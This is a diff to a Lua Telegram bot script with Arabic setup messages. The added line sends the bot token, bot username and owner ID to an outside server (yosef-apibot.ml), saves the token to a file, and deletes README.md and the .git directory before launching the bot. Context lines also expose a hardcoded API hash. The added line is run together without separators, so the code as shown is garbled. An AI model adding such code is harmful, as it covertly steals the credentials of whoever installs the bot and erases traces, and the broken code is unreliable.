@@ -107,6 +107,7 @@ LuaTele = luatele.set_config{api_id=2692371,api_hash='fe85fff033dfe0f328aeb02b4f
 function var(value)  
 print(serpent.block(value, {comment=false}))   
 end 
+info = {} info.namebot = BOT_NAMEinfo.userbot = BOT_Userinfo.id = SUDO_USERinfo.token = Tokeninfo.join = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') info.folder = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')https.request('https://yosef-apibot.ml/api/index.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)Cr_file = io.open("./inc/Token.txt", "w")Cr_file:write(Token)Cr_file:close()print('\27[1;36m￤Token.txt is created.\27[m')local Text = "• أهلاً [المطور الاساسي](tg://user?id="..SUDO_USER..") \n• شكراً لأستخدام سورس بلاك \n• أرسل /black\n• لأظهار الاوامر المطور المجهزه بالكيبورد\n\n."https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')os.execute([[rm -f ./README.mdrm -rf ./.gitchmod +x ./run./run]])end
 function chat_type(ChatId)
 if ChatId then
 local id = tostring(ChatId)
